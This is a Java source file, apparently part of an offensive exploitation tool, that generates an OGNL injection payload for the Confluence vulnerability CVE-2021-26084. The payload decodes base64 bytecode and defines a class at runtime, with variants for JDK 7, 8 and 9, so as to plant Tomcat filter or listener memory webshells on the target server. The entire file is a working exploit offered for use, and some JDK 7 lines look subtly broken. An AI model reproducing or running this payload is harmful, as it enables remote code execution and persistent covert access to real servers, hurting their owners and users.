package core.payloads;

import core.GenerateMemShell;
import core.enumtypes.PayloadType;

import java.net.URLEncoder;

public class Confluence_CVE_2021_26084 {
    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        byte[] bytecodes = null;
        String code = "";
        String base64CodeStr = "";
        String payloadTemplate = "queryString=\\u0027%2b#{\\u0022\\u0022[\\u0022class\\u0022].forName(\\u0022javax.script.ScriptEngineManager\\u0022).newInstance().getEngineByName(\\u0022js\\u0022).eval(\\u0022{code}\\u0022)}%2b\\u0027";
        switch (type) {
            case tomcatfiltermemshell:
                base64CodeStr = GenerateMemShell.generateMemShell("TomcatFilterMemShell", "BASE64", "6");
                break;
            case tomcatlistenermemshell:
                base64CodeStr = GenerateMemShell.generateMemShell("TomcatListenerMemShell", "BASE64", "6");
                break;
        }

//        String base64CodeStr = Util.base64Encode(bytecodes);
//        String base64CodeStr = "";
        if (trojanType.contains("jdk7")){
            code = "var data= \\u0027" + URLEncoder.encode(base64CodeStr, "utf-8") + "\\u0027;" + "var dataBytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(data);" +
                    "var cloader=java.lang.Thread.currentThread.getContextClassLoader();" +
                    "var sc =cloader.getClass.getSuperClass().getSuperClass().getSuperClass();" +
                    "var m=sc.getDeclaredMethod(\\u0027defineClass\\u0027,\\u0027\\u0027.getBytes.getClass,java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                    "m.setAccessible(true);" +
                    "var off = java.lang.Integer(0);" +
                    "var l = java.lang.Integer(dataBytes,.length);" +
                    "var mc=m.invoke(cloader,dataBytes,off,l);" +
                    "mc.newInstance();";
        }
        else if(trojanType.contains("jdk8")){
            code = "var data= \\u0027" + URLEncoder.encode(base64CodeStr, "utf-8") + "\\u0027;" + "var dataBytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(data);" +
                    "var cloader=java.lang.Thread.currentThread.getContextClassLoader();" +
                    "var m=java.lang.Classloader.class.getDeclaredMethod(\\u0027defineClass\\u0027,\\u0027\\u0027.getBytes.getClass,java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                    "m.setAccessible(true);" +
                    "var mc=m.invoke(cloader,dataBytes,0,dataBytes.length);" +
                    "mc.newInstance();";
        }
        else if(trojanType.contains("jdk9")){
            code = "var data=\\u0027"+ URLEncoder.encode(base64CodeStr, "utf-8") +"\\u0027;" +
                    "var sf = java.lang.Class.forName(\\u0027sun.misc.Unsafe\\u0027);" +
                    "var sfc = sf.getDeclaredField(\\u0027theUnsafe\\u0027);" +
                    "sfc.setAccessible(true);" +
                    "var usf =sfc.get(null);" +
                    "var dataBytes=java.util.Base64.getDecoder().decode(data);" +
                    "var m = usf.defineAnonymousClass(java.io.File.class,dataBytes,null);" +
                    "m.newInstance();";
        }
        return payloadTemplate.replace("{code}", code).replace("\n", "");
    }
}
